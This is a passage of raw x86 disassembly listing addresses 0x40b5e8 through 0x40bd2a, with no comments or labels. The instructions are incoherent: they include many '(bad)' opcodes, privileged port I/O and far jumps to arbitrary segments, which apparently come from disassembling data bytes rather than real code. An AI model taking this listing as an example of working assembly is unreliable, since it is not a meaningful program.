  40b5e8:	adc    BYTE PTR [edx],al
  40b5ea:	adc    BYTE PTR [esi],ah
  40b5ec:	xor    BYTE PTR [edx-0x70310cb9],dh
  40b5f2:	xor    eax,0x643658d7
  40b5f7:	lods   eax,DWORD PTR ds:[esi]
  40b5f8:	sub    BYTE PTR [ebx+0x6e],ch
  40b5fb:	iret   
  40b5fc:	cmp    al,0x76
  40b5fe:	dec    ecx
  40b5ff:	adc    edx,edi
  40b601:	push   eax
  40b602:	cdq    
  40b603:	les    edx,FWORD PTR [ebx]
  40b605:	jl     0x40b5df
  40b607:	imul   eax,ebx,0x7c
  40b60a:	data16 (bad) 
  40b60c:	int    0xe2
  40b60e:	cli    
  40b60f:	addr16 pop eax
  40b611:	xchg   ebp,eax
  40b612:	std    
  40b613:	jmp    0x5a9b:0x860c49b6
  40b61a:	adc    ch,BYTE PTR [ebp-0x19]
  40b61d:	pop    ds
  40b61e:	aaa    
  40b61f:	or     DWORD PTR [esi-0x69],ebx
  40b622:	push   cs
  40b623:	adc    al,0xa6
  40b625:	test   DWORD PTR es:[esi+0x55],0xf3498ed9
  40b62d:	push   ebp
  40b62e:	or     eax,0x23e67536
  40b633:	addr16 aas 
  40b635:	cdq    
  40b636:	jmp    0x40b5bf
  40b638:	loope  0x40b65f
  40b63a:	test   BYTE PTR [edx+0x41fb5cab],cl
  40b640:	jle    0x40b666
  40b642:	or     DWORD PTR [esi+0x118a2bc4],ebx
  40b648:	das    
  40b649:	mov    al,0xc4
  40b64b:	test   eax,0x3bd52d
  40b650:	mov    eax,ds:0x884a192b
  40b655:	cmp    dl,BYTE PTR [esi]
  40b657:	mov    eax,0x8a720c49
  40b65c:	pop    ebp
  40b65d:	repnz pop es
  40b65f:	sub    ah,ah
  40b661:	xor    edi,DWORD PTR [ebx-0x12]
  40b664:	out    0x81,al
  40b666:	(bad)  
  40b667:	loope  0x40b628
  40b669:	sbb    BYTE PTR [ecx-0x30d8b976],cl
  40b66f:	fisttp QWORD PTR [ebp-0x387840df]
  40b675:	xor    DWORD PTR [esi-0x6a8b3e38],ebx
  40b67b:	and    al,0x38
  40b67d:	cmp    eax,0xc399d8fd
  40b682:	jge    0x40b67e
  40b684:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b685:	jmp    0xb23f71e6
  40b68a:	loope  0x40b613
  40b68c:	ja     0x33b66299
  40b692:	mov    edi,DWORD PTR [edi]
  40b694:	outs   dx,DWORD PTR ds:[esi]
  40b695:	mov    dh,0x39
  40b697:	fnstsw WORD PTR [esi+0x60abf586]
  40b69d:	call   0xfb35:0x3b4c954
  40b6a4:	push   ebx
  40b6a5:	adc    BYTE PTR [ecx+0x3a17af79],cl
  40b6ab:	xor    ecx,DWORD PTR [edi]
  40b6ad:	adc    esi,DWORD PTR [ecx+edi*1-0x2e]
  40b6b1:	lea    ecx,[edx-0x5b642cb8]
  40b6b7:	call   0x32df:0x80eb7f50
  40b6be:	cmp    DWORD PTR [eax+0x21],edx
  40b6c1:	sub    eax,0x4de68f45
  40b6c6:	mov    ds:0xd22806e9,al
  40b6cb:	jne    0x40b744
  40b6cd:	idiv   DWORD PTR ds:0x25e253b1
  40b6d3:	retf   
  40b6d4:	out    0x4a,eax
  40b6d6:	cld    
  40b6d7:	sbb    al,BYTE PTR [eax+0x2b]
  40b6da:	leave  
  40b6db:	out    dx,eax
  40b6dc:	jo     0x40b727
  40b6de:	popf   
  40b6df:	repz xor DWORD PTR [ebx+0x64],esi
  40b6e3:	adc    bh,ah
  40b6e5:	xchg   ebp,eax
  40b6e6:	sub    eax,0xb832f066
  40b6eb:	test   al,0x89
  40b6ed:	adc    esi,DWORD PTR [ecx-0x52]
  40b6f0:	repnz gs push ds
  40b6f3:	in     al,dx
  40b6f4:	mov    edx,0xf92b2b64
  40b6f9:	adc    BYTE PTR [eax],bh
  40b6fb:	sub    ebx,edx
  40b6fd:	into   
  40b6fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b6ff:	clc    
  40b700:	push   esi
  40b701:	mov    esp,0x134577b4
  40b706:	dec    edi
  40b707:	in     al,dx
  40b708:	stos   DWORD PTR es:[edi],eax
  40b709:	and    al,0x40
  40b70b:	mov    dl,al
  40b70d:	in     eax,dx
  40b70e:	out    dx,eax
  40b70f:	push   ds
  40b710:	adc    DWORD PTR [ebx-0x1ffbb40d],ebx
  40b716:	jne    0x40b783
  40b718:	sbb    esp,ecx
  40b71a:	out    dx,al
  40b71b:	add    dl,bl
  40b71d:	cmp    bh,dh
  40b71f:	mov    BYTE PTR [ecx],dl
  40b721:	data16 sub bl,BYTE PTR [ebx+eax*2-0x6a]
  40b726:	fld    st(0)
  40b728:	stos   DWORD PTR es:[edi],eax
  40b729:	push   0x15
  40b72b:	xor    al,0x4
  40b72d:	mov    esp,0xd358acf6
  40b732:	pop    esp
  40b733:	mov    eax,ss:0x52837e0c
  40b739:	cld    
  40b73a:	xchg   ah,ah
  40b73c:	popa   
  40b73d:	jae    0x40b772
  40b73f:	inc    ebp
  40b740:	fldenv [ecx+0x17]
  40b743:	sbb    edi,DWORD PTR [esi+edx*4-0x68f0a086]
  40b74a:	in     eax,dx
  40b74b:	(bad)  
  40b74c:	sti    
  40b74d:	loope  0x40b7c1
  40b74f:	inc    edi
  40b750:	test   al,0x7d
  40b752:	mov    ch,0x21
  40b754:	les    esp,FWORD PTR [ecx]
  40b756:	or     esi,DWORD PTR [ecx]
  40b758:	or     bh,BYTE PTR [edi+0x3b767a17]
  40b75e:	shl    BYTE PTR [eax],cl
  40b760:	xor    edi,DWORD PTR [esi+edi*8]
  40b763:	enter  0x35c1,0x1d
  40b767:	add    eax,DWORD PTR [ebp+0x4df5c229]
  40b76d:	push   es
  40b76e:	lds    esi,FWORD PTR [ebx-0x90754a1]
  40b774:	arpl   WORD PTR [esi+0x4aa0303d],dx
  40b77a:	xchg   edi,eax
  40b77b:	shl    BYTE PTR [ebx+edx*8+0x43bf2936],1
  40b782:	(bad)  
  40b784:	dec    BYTE PTR [edx]
  40b786:	icebp  
  40b787:	sbb    edx,DWORD PTR [edx]
  40b789:	jae    0x40b808
  40b78b:	cmp    BYTE PTR [edx-0x4b],ah
  40b78e:	dec    ecx
  40b78f:	mov    esp,0xf8f1749c
  40b794:	jnp    0x40b79e
  40b796:	out    dx,eax
  40b797:	mov    esp,ecx
  40b799:	pop    es
  40b79a:	bound  ebx,QWORD PTR [ebp-0x3bc2a8bb]
  40b7a0:	imul   ecx,edi,0x5b4a74d4
  40b7a6:	repnz sub eax,0xa77071f2
  40b7ac:	mov    ch,0x49
  40b7ae:	pop    ebp
  40b7af:	adc    DWORD PTR [edi+esi*1-0x702660e9],esi
  40b7b6:	cmp    BYTE PTR [ecx],0xdb
  40b7b9:	add    dl,BYTE PTR [ecx+0x40]
  40b7bc:	neg    eax
  40b7be:	lahf   
  40b7bf:	enter  0x8741,0xca
  40b7c3:	and    DWORD PTR [edi+0x34ce33f5],edi
  40b7c9:	mov    gs,WORD PTR [edx+0x2f]
  40b7cc:	sti    
  40b7cd:	fldz   
  40b7cf:	(bad)  
  40b7d0:	nop
  40b7d1:	or     DWORD PTR [eax],esi
  40b7d3:	mov    dl,0x94
  40b7d5:	nop
  40b7d6:	sub    DWORD PTR [ecx],0xffffffdd
  40b7d9:	(bad)  
  40b7da:	ja     0x40b841
  40b7dc:	xor    cl,BYTE PTR [eax]
  40b7de:	loop   0x40b76f
  40b7e0:	cs xchg ebx,eax
  40b7e2:	das    
  40b7e3:	in     eax,0x71
  40b7e5:	out    dx,eax
  40b7e6:	inc    ebx
  40b7e7:	(bad)  
  40b7e8:	clc    
  40b7e9:	lea    ebp,[ecx+ebx*4-0x42]
  40b7ed:	and    al,0x2e
  40b7ef:	fsubr  DWORD PTR [esi]
  40b7f1:	mov    esp,0xcb5235e0
  40b7f6:	ja     0x40b781
  40b7f8:	imul   DWORD PTR [esi]
  40b7fa:	add    al,0xc1
  40b7fc:	in     eax,0xf2
  40b7fe:	fnstenv [ebp+0x3f3108c4]
  40b804:	popa   
  40b805:	sti    
  40b806:	adc    ch,BYTE PTR [ebx]
  40b808:	xlat   BYTE PTR ds:[ebx]
  40b809:	into   
  40b80a:	push   eax
  40b80b:	push   ds
  40b80c:	int    0x78
  40b80e:	add    esi,DWORD PTR [ebx+0x1c]
  40b811:	loopne 0x40b81a
  40b813:	lahf   
  40b814:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b815:	shl    BYTE PTR [edi-0x7d],cl
  40b818:	test   al,0xc1
  40b81a:	repnz rcr DWORD PTR [esi-0x40b9e165],1
  40b821:	cmc    
  40b822:	out    dx,eax
  40b823:	aad    0xa6
  40b825:	mov    edi,0x5da75982
  40b82a:	cmp    eax,0x840a75de
  40b82f:	push   ebp
  40b830:	loop   0x40b841
  40b832:	or     BYTE PTR [edi-0x4],ch
  40b835:	cmc    
  40b836:	sbb    eax,DWORD PTR [edx-0x16]
  40b839:	push   esp
  40b83a:	inc    esi
  40b83b:	jg     0x40b894
  40b83d:	mov    al,0x34
  40b83f:	fs xchg esi,eax
  40b841:	xlat   BYTE PTR ds:[ebx]
  40b842:	add    ah,BYTE PTR [eax+0x31c5fe25]
  40b848:	scas   al,BYTE PTR es:[edi]
  40b849:	cmp    al,0xa7
  40b84b:	lds    edx,FWORD PTR [ecx-0x3e384c3]
  40b851:	mov    ch,0x1
  40b853:	jge    0x40b850
  40b855:	push   0xb2db979
  40b85a:	add    dl,bh
  40b85c:	daa    
  40b85d:	stos   BYTE PTR es:[edi],al
  40b85e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b85f:	stos   BYTE PTR es:[edi],al
  40b860:	mov    edx,0x29bd50e1
  40b865:	ss aas 
  40b867:	imul   esi,DWORD PTR [ebp+0x3d],0xffffffc2
  40b86b:	adc    ebp,esi
  40b86d:	mov    BYTE PTR [eiz*4-0x4fb89e49],bl
  40b874:	mov    dh,0xc0
  40b876:	hlt    
  40b877:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b878:	mov    fs,WORD PTR [edx+0x37716228]
  40b87e:	mov    bh,0x23
  40b880:	fs mov eax,0x9b6735d9
  40b886:	or     eax,0x8dd4ab27
  40b88b:	jecxz  0x40b8db
  40b88d:	stos   DWORD PTR es:[edi],eax
  40b88e:	cwde   
  40b88f:	loope  0x40b8a2
  40b891:	sbb    ebp,DWORD PTR [eax]
  40b893:	inc    ebp
  40b894:	fwait
  40b895:	push   eax
  40b896:	popf   
  40b897:	pop    esi
  40b898:	mov    ch,0xca
  40b89a:	mov    ebp,esp
  40b89c:	and    al,0x3
  40b89e:	jo     0x40b858
  40b8a0:	or     eax,0xa4735284
  40b8a5:	xor    DWORD PTR [ebx],ecx
  40b8a7:	shl    DWORD PTR [edx],0xee
  40b8aa:	in     al,0x14
  40b8ac:	jno    0x40b89d
  40b8ae:	arpl   WORD PTR [ecx+0x19],dx
  40b8b1:	jle    0x40b91b
  40b8b3:	pop    es
  40b8b4:	in     eax,0x13
  40b8b6:	xchg   edi,eax
  40b8b7:	(bad)  
  40b8b8:	sahf   
  40b8b9:	xchg   ecx,eax
  40b8ba:	daa    
  40b8bb:	addr16 pusha 
  40b8bd:	test   al,0xdc
  40b8bf:	push   edx
  40b8c0:	shr    ebx,cl
  40b8c2:	adc    ecx,ecx
  40b8c4:	jo     0x40b880
  40b8c6:	call   0xa579:0xa083
  40b8cc:	jecxz  0x40b928
  40b8ce:	test   BYTE PTR fs:[esi+0x1721655b],cl
  40b8d5:	sar    BYTE PTR [edx-0x13],cl
  40b8d8:	xchg   BYTE PTR [eax+0x2],cl
  40b8db:	sbb    ch,BYTE PTR [eax]
  40b8dd:	arpl   WORD PTR [edi],ax
  40b8df:	add    eax,0xf261be73
  40b8e4:	pop    esp
  40b8e5:	adc    ah,0xaf
  40b8e8:	xchg   edi,eax
  40b8e9:	push   0x54
  40b8eb:	add    BYTE PTR [edx-0x6e1f378e],0x97
  40b8f2:	pop    esp
  40b8f3:	jmp    0x40b95a
  40b8f5:	add    DWORD PTR [edx-0x55],ebp
  40b8f8:	or     BYTE PTR [edx+0x2f],bl
  40b8fb:	dec    ebp
  40b8fc:	test   al,0xae
  40b8fe:	daa    
  40b8ff:	inc    ebx
  40b900:	aam    0xfd
  40b902:	xchg   esp,eax
  40b903:	in     eax,0x76
  40b905:	xor    eax,0x85de44fc
  40b90a:	push   edi
  40b90b:	int3   
  40b90c:	sub    BYTE PTR [eax+ecx*4],dh
  40b90f:	sub    eax,0x2d4496ff
  40b914:	xchg   ebp,eax
  40b915:	es jmp 0xa1a148bc
  40b91b:	stc    
  40b91c:	add    ah,BYTE PTR [esp+eiz*8-0x44]
  40b920:	xchg   edx,eax
  40b921:	mov    esi,0x7c1d320d
  40b926:	in     al,dx
  40b927:	inc    ecx
  40b928:	pop    ebp
  40b929:	fld    DWORD PTR [ebx+0x20]
  40b92c:	xlat   BYTE PTR ds:[ebx]
  40b92d:	sbb    al,0x9f
  40b92f:	xchg   DWORD PTR [ecx+0x53edc26],eax
  40b935:	add    ebp,DWORD PTR [edi-0x7e]
  40b938:	jnp    0x40b94e
  40b93a:	and    al,0x44
  40b93c:	imul   esp,DWORD PTR [edx+0x6cb1ac44],0xffffffbf
  40b943:	cli    
  40b944:	(bad)  
  40b945:	mov    ah,0x7d
  40b947:	inc    eax
  40b948:	xor    eax,0xb99f4d48
  40b94d:	pop    es
  40b94e:	enter  0xc535,0xe5
  40b952:	in     eax,dx
  40b953:	aam    0xe2
  40b955:	out    0x4c,eax
  40b957:	jecxz  0x40b8e4
  40b959:	(bad)  
  40b95a:	xor    eax,0x8b07cd34
  40b95f:	clc    
  40b960:	sub    DWORD PTR [ebx-0x5cbbb558],ebx
  40b966:	mov    ecx,0xdd4f75a3
  40b96b:	fdiv   st(4),st
  40b96d:	pusha  
  40b96e:	rol    DWORD PTR [edi],1
  40b970:	stos   WORD PTR es:[edi],ax
  40b972:	mov    ds:0xd21feda3,al
  40b977:	pop    es
  40b978:	popf   
  40b979:	popf   
  40b97a:	mov    ds:0xf247e497,al
  40b97f:	sbb    ecx,ebp
  40b981:	stos   DWORD PTR es:[edi],eax
  40b982:	mov    cl,0x63
  40b984:	or     al,0x3b
  40b986:	clc    
  40b987:	js     0x40b996
  40b989:	lahf   
  40b98a:	xor    al,0xae
  40b98c:	popf   
  40b98d:	popa   
  40b98e:	pop    ss
  40b98f:	jo     0x40b977
  40b991:	aaa    
  40b992:	popa   
  40b993:	jnp    0x40b9d4
  40b995:	sub    cl,dh
  40b997:	pop    eax
  40b998:	sbb    eax,0xfa48dac9
  40b99d:	mov    dh,0xad
  40b99f:	mov    cl,BYTE PTR [edi+0x69525f]
  40b9a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b9a6:	push   DWORD PTR ss:[ebp-0x55]
  40b9aa:	dec    edx
  40b9ab:	sub    BYTE PTR [eax],dh
  40b9ad:	or     DWORD PTR [ecx],ecx
  40b9af:	mov    ebp,0xba68b29d
  40b9b4:	xor    bl,al
  40b9b6:	lds    esp,FWORD PTR ds:[ecx-0x26]
  40b9ba:	fmul   QWORD PTR [ebx]
  40b9bc:	push   esp
  40b9bd:	pop    ss
  40b9be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b9bf:	xchg   edi,eax
  40b9c0:	adc    eax,0xa9d2c38a
  40b9c5:	ins    BYTE PTR es:[edi],dx
  40b9c6:	and    BYTE PTR [edx+0x488b95dc],dh
  40b9cc:	or     edx,DWORD PTR [ecx+0x14]
  40b9cf:	add    BYTE PTR [esi],0x8f
  40b9d2:	xchg   BYTE PTR [ebx+ecx*1-0x73],ch
  40b9d6:	jl     0x40b95c
  40b9d8:	fst    QWORD PTR [ecx]
  40b9da:	fimul  WORD PTR [edx]
  40b9dc:	enter  0x506a,0x81
  40b9e0:	add    DWORD PTR [ebx],edx
  40b9e2:	xchg   edi,eax
  40b9e3:	dec    esp
  40b9e4:	daa    
  40b9e5:	jg     0x40b9df
  40b9e7:	stos   DWORD PTR es:[edi],eax
  40b9e8:	stos   BYTE PTR es:[edi],al
  40b9e9:	mov    WORD PTR [esi+esi*4-0xa],gs
  40b9ed:	mov    ebx,0x6af8302a
  40b9f2:	sub    DWORD PTR [ebp-0x2e],0x2f
  40b9f6:	stos   BYTE PTR es:[edi],al
  40b9f7:	mov    DWORD PTR [esi-0x2d4fe90],ecx
  40b9fd:	adc    DWORD PTR [esi-0x1a8c1d02],eax
  40ba03:	inc    esi
  40ba04:	lea    esp,ds:0x87576718
  40ba0a:	stos   BYTE PTR es:[edi],al
  40ba0b:	pop    edx
  40ba0c:	adc    esi,DWORD PTR [ecx]
  40ba0e:	stos   BYTE PTR es:[edi],al
  40ba0f:	jg     0x40ba51
  40ba11:	dec    ebp
  40ba12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba13:	mov    bl,bl
  40ba15:	adc    DWORD PTR [esi+eiz*1],ecx
  40ba18:	scas   eax,DWORD PTR es:[edi]
  40ba19:	adc    edi,DWORD PTR [eax-0x44]
  40ba1c:	cmp    dl,BYTE PTR [esi]
  40ba1e:	int3   
  40ba1f:	xlat   BYTE PTR ds:[ebx]
  40ba20:	clc    
  40ba21:	add    BYTE PTR [edx+0x47],dh
  40ba24:	jmp    0x1405:0x66b109e7
  40ba2b:	repnz das 
  40ba2d:	call   0x75e6a558
  40ba32:	pop    eax
  40ba33:	nop
  40ba34:	xor    eax,0x77c23e08
  40ba39:	adc    DWORD PTR [ecx+0x496a9d99],eax
  40ba3f:	aam    0xff
  40ba41:	call   0xf24a:0x48eea18c
  40ba48:	mov    eax,edi
  40ba4a:	fadd   QWORD PTR [eax+0x6e]
  40ba4d:	cs jle 0x40ba4a
  40ba50:	mov    BYTE PTR [edx-0xb940681],dl
  40ba56:	pop    eax
  40ba57:	(bad)  
  40ba58:	(bad)  
  40ba59:	jg     0x40bacf
  40ba5b:	sub    DWORD PTR [edx],edi
  40ba5d:	das    
  40ba5e:	mov    bl,0x43
  40ba60:	pop    ebx
  40ba61:	xor    BYTE PTR [esi+ebp*2+0x4b],ah
  40ba65:	pop    esi
  40ba66:	retf   
  40ba67:	aad    0xc
  40ba69:	jecxz  0x40ba23
  40ba6b:	enter  0x7495,0x18
  40ba6f:	inc    eax
  40ba70:	hlt    
  40ba71:	imul   ebx,DWORD PTR [eax],0x17
  40ba74:	xor    eax,0x4daad005
  40ba79:	popf   
  40ba7a:	and    esp,edx
  40ba7c:	inc    esi
  40ba7d:	pop    es
  40ba7e:	lods   al,BYTE PTR ds:[esi]
  40ba7f:	aam    0x4f
  40ba81:	fst    DWORD PTR [ecx+0x5fab3df5]
  40ba87:	xchg   esp,eax
  40ba88:	jmp    0x40ba5a
  40ba8a:	dec    edi
  40ba8b:	mov    dl,0x21
  40ba8d:	cli    
  40ba8e:	das    
  40ba8f:	fucomp st(7)
  40ba91:	mov    ch,0x73
  40ba93:	ss bswap ebp
  40ba96:	mov    esi,0xde97d012
  40ba9b:	sub    edx,edi
  40ba9d:	stc    
  40ba9e:	aad    0x6a
  40baa0:	fcom   QWORD PTR [edi]
  40baa2:	inc    eax
  40baa3:	inc    esi
  40baa4:	or     DWORD PTR [edx-0x4],0x1656e8fb
  40baab:	loopne 0x40ba8a
  40baad:	sub    ch,BYTE PTR [esi+0x35]
  40bab0:	xor    BYTE PTR [edi-0x1c],dl
  40bab3:	xor    BYTE PTR [ecx+0x2b6b794f],0xf
  40baba:	add    DWORD PTR [eax-0x1dea40f3],edi
  40bac0:	pop    ds
  40bac1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bac2:	dec    edi
  40bac3:	std    
  40bac4:	out    0x54,eax
  40bac6:	or     BYTE PTR [esp+ebp*4-0x369d90aa],dh
  40bacd:	xchg   BYTE PTR [edi-0x1c761688],bh
  40bad3:	mov    edx,0x2b92ee4e
  40bad8:	mov    dl,BYTE PTR [edi+0x261c6062]
  40bade:	dec    ebx
  40badf:	xchg   ecx,eax
  40bae0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bae1:	push   edi
  40bae2:	xchg   esp,eax
  40bae3:	test   eax,0xbb3c7d15
  40bae8:	sub    al,0x4b
  40baea:	jbe    0x40ba84
  40baec:	addr16 enter 0x141d,0xe5
  40baf1:	inc    edx
  40baf2:	lods   eax,DWORD PTR ds:[esi]
  40baf3:	inc    edx
  40baf4:	push   DWORD PTR [ecx+esi*4+0x71]
  40baf8:	in     eax,0xca
  40bafa:	mov    eax,0xd9317fbf
  40baff:	mov    ds:0x3546e69c,eax
  40bb04:	inc    edx
  40bb05:	push   0xffffffbe
  40bb07:	sbb    ebp,esp
  40bb09:	cs pop ebp
  40bb0b:	in     eax,0xc2
  40bb0d:	shl    DWORD PTR ds:0x69e5d10c,cl
  40bb13:	push   edx
  40bb14:	ins    DWORD PTR es:[edi],dx
  40bb15:	sbb    edi,esi
  40bb17:	cmp    ebx,DWORD PTR [eax]
  40bb19:	(bad)  
  40bb1a:	pop    eax
  40bb1b:	mov    ds:0x5f4f51c1,al
  40bb20:	xchg   BYTE PTR [ebp-0x682fe82],dh
  40bb26:	fnstsw WORD PTR ds:0x7b9d867
  40bb2c:	add    eax,0xe2b43b53
  40bb31:	addr16 or eax,0x90d30f34
  40bb37:	mov    ebx,0xd57dd30c
  40bb3c:	mov    bh,0x9e
  40bb3e:	inc    ebx
  40bb3f:	aam    0xfd
  40bb41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb42:	jmp    0x40bb08
  40bb44:	out    dx,eax
  40bb45:	sub    al,0xe5
  40bb47:	xchg   ecx,eax
  40bb48:	nop
  40bb49:	mov    bh,0x8c
  40bb4b:	out    0xd0,eax
  40bb4d:	mov    ds,WORD PTR ds:[eax+0x5c]
  40bb51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb52:	int3   
  40bb53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb54:	(bad)  
  40bb56:	(bad)  
  40bb57:	cdq    
  40bb58:	sub    al,0x1c
  40bb5a:	jnp    0x40bb4e
  40bb5c:	out    0xfb,eax
  40bb5e:	cli    
  40bb5f:	icebp  
  40bb60:	push   ebp
  40bb61:	jmp    0x59bf:0x568b4991
  40bb68:	ret    0x9309
  40bb6b:	jns    0x40bbc2
  40bb6d:	pop    esp
  40bb6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb6f:	sub    eax,0xdc503b71
  40bb74:	sti    
  40bb75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb76:	mov    eax,0x4df50d03
  40bb7b:	(bad)  
  40bb7d:	sbb    BYTE PTR [edx+0xd302a11],dl
  40bb83:	add    eax,0x4f056bf7
  40bb88:	ds sahf 
  40bb8a:	jb     0x40bb42
  40bb8c:	sub    eax,DWORD PTR [eax+0x189656f8]
  40bb92:	lods   eax,DWORD PTR ds:[esi]
  40bb93:	call   FWORD PTR [ecx]
  40bb95:	cmc    
  40bb96:	outs   dx,BYTE PTR ds:[esi]
  40bb97:	aaa    
  40bb98:	sbb    BYTE PTR [edx+0x5165a422],bh
  40bb9e:	pop    eax
  40bb9f:	mov    bl,0xd1
  40bba1:	lea    eax,[ebx]
  40bba3:	push   eax
  40bba4:	rcl    BYTE PTR [ebx],cl
  40bba6:	(bad)  
  40bba7:	mov    ebx,0x44a2a47f
  40bbac:	imul   esp,edx,0xffffff8e
  40bbaf:	mov    eax,ds:0x835434d0
  40bbb4:	das    
  40bbb5:	arpl   WORD PTR [ebx],si
  40bbb7:	mov    ecx,DWORD PTR [ecx]
  40bbb9:	adc    al,dh
  40bbbb:	mov    al,ds:0x4f640ad
  40bbc0:	mov    bh,0xc
  40bbc2:	dec    edx
  40bbc3:	cmp    DWORD PTR [eax+0x7f90b705],edx
  40bbc9:	push   cs
  40bbca:	cmp    DWORD PTR [ebp-0x78],ebx
  40bbcd:	xor    ebx,DWORD PTR [esi+ebx*2+0x4a]
  40bbd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bbd2:	pop    eax
  40bbd3:	mov    cl,0x3f
  40bbd5:	nop
  40bbd6:	retf   0x158d
  40bbd9:	xchg   edi,eax
  40bbda:	xchg   edx,eax
  40bbdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bbdc:	mov    bh,0x3f
  40bbde:	cli    
  40bbdf:	in     al,dx
  40bbe0:	(bad)  
  40bbe2:	fwait
  40bbe3:	ins    BYTE PTR es:[edi],dx
  40bbe4:	lds    edi,FWORD PTR [esi+0x2b08bb63]
  40bbea:	out    0x8c,eax
  40bbec:	lock inc ebp
  40bbee:	mov    eax,cs
  40bbf0:	lods   al,BYTE PTR ds:[esi]
  40bbf1:	pushf  
  40bbf2:	call   0x4a4e097b
  40bbf7:	test   al,0xf8
  40bbf9:	add    dl,BYTE PTR [ebx+0x7a]
  40bbfc:	popf   
  40bbfd:	mov    dh,0x92
  40bbff:	neg    BYTE PTR [edi+0x68]
  40bc02:	call   0x41bc:0xf4f7008c
  40bc09:	ss cwde 
  40bc0b:	cmp    eax,esi
  40bc0d:	xor    BYTE PTR [edi+0x43],0x93
  40bc11:	and    DWORD PTR [ebx],ebx
  40bc13:	(bad)  
  40bc14:	test   al,0xd8
  40bc16:	inc    eax
  40bc17:	mov    ch,0x1b
  40bc19:	add    al,bh
  40bc1b:	mov    ecx,0xeabee496
  40bc20:	pop    ss
  40bc21:	mov    ecx,0xac656d34
  40bc26:	repz sar DWORD PTR [ebp+0x2186bb2b],0x1a
  40bc2e:	mov    al,BYTE PTR [ebp-0x690fe13e]
  40bc34:	cs test eax,0xa40db654
  40bc3a:	les    ebx,FWORD PTR [ebp+eiz*1-0x5bc5aac8]
  40bc41:	jge    0x40bc30
  40bc43:	jae    0x40bc09
  40bc45:	mov    ebx,0xafc29d52
  40bc4a:	sahf   
  40bc4b:	pop    esp
  40bc4c:	jne    0x40bc6c
  40bc4e:	jae    0x40bbf8
  40bc50:	and    esp,DWORD PTR [esi+0x5cd061ce]
  40bc56:	shr    DWORD PTR [ebp+0x5318c1c8],1
  40bc5c:	dec    edi
  40bc5d:	xor    dh,BYTE PTR [edx+0x6d]
  40bc60:	pop    esp
  40bc61:	adc    DWORD PTR [edx+esi*1],ecx
  40bc64:	iret   
  40bc65:	jge    0x40bcbf
  40bc67:	dec    eax
  40bc68:	aam    0x17
  40bc6a:	sti    
  40bc6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc6c:	loop   0x40bc09
  40bc6e:	test   al,0xef
  40bc70:	arpl   WORD PTR [ebp+0x2e36bac],cx
  40bc76:	mov    ebx,0x72a400a6
  40bc7b:	sub    eax,0x5c15b3f8
  40bc81:	repnz or eax,0x3c1465fb
  40bc87:	fsubp  st(0),st
  40bc89:	inc    eax
  40bc8a:	rcr    DWORD PTR [edx],0x5c
  40bc8d:	adc    DWORD PTR [edi+0x6ddf8a19],ebx
  40bc93:	out    0x52,eax
  40bc95:	test   DWORD PTR [ebx-0x92bef7],eax
  40bc9b:	not    ecx
  40bc9d:	xlat   BYTE PTR ds:[ebx]
  40bc9e:	mov    esi,0x8837ff50
  40bca3:	sub    BYTE PTR [edx-0xd],0x54
  40bca7:	add    ebp,DWORD PTR [ebx]
  40bca9:	ror    WORD PTR gs:[edi-0x696e818e],cl
  40bcb1:	xor    eax,0x864419e3
  40bcb6:	mov    WORD PTR [edx-0x3d8a0290],es
  40bcbc:	pop    edx
  40bcbd:	cmp    al,0x15
  40bcbf:	lods   al,BYTE PTR ds:[esi]
  40bcc0:	ins    BYTE PTR es:[edi],dx
  40bcc1:	dec    ebx
  40bcc2:	jge    0x40bd25
  40bcc4:	xchg   ebx,eax
  40bcc5:	xor    cl,bl
  40bcc7:	pop    ecx
  40bcc8:	cmp    eax,0xe855987e
  40bccd:	push   ecx
  40bcce:	test   cl,ch
  40bcd0:	mov    DWORD PTR [edi],ecx
  40bcd2:	jns    0x40bc6a
  40bcd4:	dec    ebx
  40bcd5:	adc    eax,DWORD PTR [edi]
  40bcd7:	adc    DWORD PTR ds:0x9a53cc3d,esi
  40bcdd:	mov    ebp,0x90cd88b3
  40bce2:	sbb    DWORD PTR [esi-0x2332e10],edx
  40bce8:	pusha  
  40bce9:	gs cmp ah,dl
  40bcec:	push   ecx
  40bced:	xchg   ebp,esi
  40bcef:	adc    eax,DWORD PTR [ecx]
  40bcf1:	(bad)  
  40bcf2:	cmp    al,0x42
  40bcf5:	xchg   DWORD PTR [edx],edi
  40bcf7:	cmc    
  40bcf8:	stos   BYTE PTR es:[edi],al
  40bcf9:	(bad)
  40bcfc:	push   edi
  40bcfd:	xchg   ebp,eax
  40bcfe:	arpl   WORD PTR [edx],dx
  40bd00:	int3   
  40bd01:	jno    0x40bd5e
  40bd03:	cmp    DWORD PTR [edi],edi
  40bd05:	aaa    
  40bd06:	stos   BYTE PTR es:[edi],al
  40bd07:	repnz sbb cl,0xb3
  40bd0b:	leave  
  40bd0c:	aad    0xbc
  40bd0e:	jg     0x40bd02
  40bd10:	hlt    
  40bd11:	popa   
  40bd12:	or     eax,DWORD PTR [edi+0x1a]
  40bd15:	mov    esp,0xdd3ba214
  40bd1a:	dec    edi
  40bd1b:	mov    al,0xbe
  40bd1d:	mov    cl,0x6c
  40bd1f:	cmp    DWORD PTR [edi-0x6b4ab9be],edi
  40bd25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd26:	jnp    0x40bcda
  40bd28:	and    cl,BYTE PTR [edi]
  40bd2a:	push   0xd296c5b8
